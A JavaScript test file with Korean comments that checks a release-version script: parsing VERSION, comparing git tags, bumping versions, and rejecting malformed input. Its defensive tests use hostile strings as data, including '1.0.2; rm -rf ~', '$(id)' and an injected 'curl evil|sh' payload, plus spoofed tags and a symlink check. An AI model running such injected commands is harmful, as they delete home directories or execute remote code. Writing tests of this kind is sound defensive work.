'use strict';
// release-version.test.js — VERSION 파일과 v* 태그 비교·올리기 (계획서 결정 32)
// 정상 / 악성·우회 / 경계 3계층
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync, execFileSync } = require('child_process');
const { parseVersion, latestTag, bump, checkVersion } = require('./release-version');

const REPO = path.resolve(__dirname, '..');
const g = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
// 스크립트를 담은 임시 레포 (실제 레포·원격을 건드리지 않음)
function tmpRepo(version, tags = []) {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'relv-')));
  fs.mkdirSync(path.join(d, 'scripts'));
  fs.copyFileSync(path.join(__dirname, 'release-version.js'), path.join(d, 'scripts', 'release-version.js'));
  g(d, 'init', '-q'); g(d, 'config', 'user.email', 't@t'); g(d, 'config', 'user.name', 't');
  if (version !== null) fs.writeFileSync(path.join(d, 'VERSION'), version);
  g(d, 'add', '-A'); g(d, 'commit', '-q', '-m', 'init');
  for (const t of tags) g(d, 'tag', t);
  return d;
}
const run = (d, ...a) => spawnSync(process.execPath, [path.join(d, 'scripts', 'release-version.js'), ...a], { cwd: d, encoding: 'utf8' });

// ── 정상 ─────────────────────────────────────────────────────────────
test('정상: 버전 읽기·최신 태그·올리기', () => {
  assert.deepStrictEqual(parseVersion('1.0.2\n'), [1, 0, 2]);
  assert.deepStrictEqual(latestTag(['v1.0.0', 'v1.0.10', 'v1.0.9']), [1, 0, 10], '숫자로 비교 (1.0.10 > 1.0.9)');
  assert.deepStrictEqual(bump([1, 0, 9]), [1, 0, 10]);
  assert.deepStrictEqual(bump([1, 2, 3], 'minor'), [1, 3, 0]);
  assert.deepStrictEqual(bump([1, 2, 3], 'major'), [2, 0, 0]);
});

test('정상: VERSION 이 최신 태그보다 크면 통과, 같거나 작으면 실패 + 다음 버전 제안', () => {
  assert.strictEqual(checkVersion('1.0.2\n', ['v1.0.0', 'v1.0.1']).ok, true);
  const same = checkVersion('1.0.1\n', ['v1.0.0', 'v1.0.1']);
  assert.strictEqual(same.ok, false); assert.strictEqual(same.next, '1.0.2'); assert.strictEqual(same.latest, 'v1.0.1');
  assert.strictEqual(checkVersion('1.0.0', ['v1.0.1']).ok, false);
});

test('정상: CLI — check 는 커밋된 값, bump 는 VERSION 을 쓰고 이미 올렸으면 그대로, release-tag 는 v 붙인 이름', () => {
  const d = tmpRepo('1.0.1\n', ['v1.0.0', 'v1.0.1']);
  assert.strictEqual(run(d, 'check').status, 1);
  let r = run(d, 'bump');
  assert.strictEqual(r.status, 0, r.stderr); assert.match(r.stdout, /1\.0\.1 → 1\.0\.2/);
  assert.strictEqual(fs.readFileSync(path.join(d, 'VERSION'), 'utf8'), '1.0.2\n');
  assert.strictEqual(run(d, 'check').status, 1, '커밋 전에는 HEAD 값(1.0.1)으로 판정');
  g(d, 'commit', '-qam', 'bump');
  r = run(d, 'check'); assert.strictEqual(r.status, 0, r.stderr); assert.match(r.stdout, /1\.0\.2 > 최신 태그 v1\.0\.1/);
  r = run(d, 'bump'); assert.match(r.stdout, /이미 최신 태그보다 큽니다/, '두 번 실행해도 두 번 올리지 않음');
  assert.strictEqual(fs.readFileSync(path.join(d, 'VERSION'), 'utf8'), '1.0.2\n');
  assert.strictEqual(run(d, 'release-tag').stdout.trim(), 'v1.0.2');
  assert.strictEqual(run(d, 'latest').stdout.trim(), 'v1.0.1');
});

test('정상: 실제 레포 VERSION 은 형식이 맞다', () => {
  assert.ok(parseVersion(fs.readFileSync(path.join(REPO, 'VERSION'), 'utf8')), 'VERSION 은 X.Y.Z 한 줄');
});

// ── 악성·우회 ────────────────────────────────────────────────────────
test('악성: VERSION 에 셸 문자·접두어·접미어·줄 여러 개·0 앞붙임·초대형 숫자 → 형식 오류', () => {
  for (const bad of ['1.0.2; rm -rf ~', '$(id)', 'v1.0.2', '1.0.2-beta', '1.0.2\n1.0.3', ' 1.0.2', '1.0', '1.0.2.3', '01.0.2', '1.0.9999999', '1.0.2\n\n', '１.0.2', '', null, 7, 'x'.repeat(1000)]) {
    assert.strictEqual(parseVersion(bad), null, JSON.stringify(bad));
    assert.strictEqual(checkVersion(bad, ['v1.0.0']).ok, false, JSON.stringify(bad));
  }
});

test('악성: 위장 태그(v9.9.9-evil · v9.9.9.1 · V9.0.0 · 9.9.9 · 공백 붙은 것)는 최신 판정에서 무시', () => {
  const tags = ['v1.0.1', 'v9.9.9-evil', 'v9.9.9.1', 'V9.0.0', '9.9.9', 'v9.9.9 ', 'refs/tags/v9.9.9', 'v09.0.0'];
  assert.deepStrictEqual(latestTag(tags), [1, 0, 1]);
  assert.strictEqual(checkVersion('1.0.2', tags).ok, true, '위장 태그 때문에 막히지 않음');
});

test('악성: release-tag 는 VERSION 이 링크·형식 오류면 실패 (워크플로가 이상한 태그를 만들지 않음)', () => {
  const d = tmpRepo('1.0.2\n');
  fs.writeFileSync(path.join(d, 'VERSION'), '1.0.2"; curl evil|sh #\n');
  assert.strictEqual(run(d, 'release-tag').status, 1);
  fs.rmSync(path.join(d, 'VERSION'));
  fs.writeFileSync(path.join(d, 'elsewhere'), '9.9.9\n');
  // 윈도우 권한 없으면(EPERM, 개발자 모드 꺼짐) 링크 시험만 건너뜀 — 그 PC 에선 공격자도 파일 심볼릭 링크를 못 만든다
  if (require('../.claude/hooks/lib/testfs').trySymlink(path.join(d, 'elsewhere'), path.join(d, 'VERSION')) !== null) assert.strictEqual(run(d, 'release-tag').status, 1, '링크는 거부');
});

// ── 경계 ─────────────────────────────────────────────────────────────
test('경계: 태그가 하나도 없으면(첫 릴리스) 형식만 맞으면 통과, VERSION 없으면 bump 가 0.0.1', () => {
  assert.strictEqual(checkVersion('1.0.0', []).ok, true);
  assert.strictEqual(checkVersion('1.0.0', undefined).ok, true);
  const d = tmpRepo(null);
  assert.strictEqual(run(d, 'check').status, 1, 'VERSION 이 커밋 안 됐으면 실패');
  const r = run(d, 'bump'); assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(fs.readFileSync(path.join(d, 'VERSION'), 'utf8'), '0.0.1\n');
});

test('경계: 모르는 올림 종류·모르는 명령은 오류, --remote 는 원격이 없으면 로컬 태그로', () => {
  assert.throws(() => bump([1, 0, 0], 'huge'), /모르는 올림 종류/);
  const d = tmpRepo('1.0.1\n', ['v1.0.1']);
  assert.strictEqual(run(d, 'bump', 'huge').status, 1);
  assert.strictEqual(run(d, 'nope').status, 1);
  const r = run(d, 'check', '--remote');
  assert.strictEqual(r.status, 1); assert.match(r.stderr, /태그: local/);
});
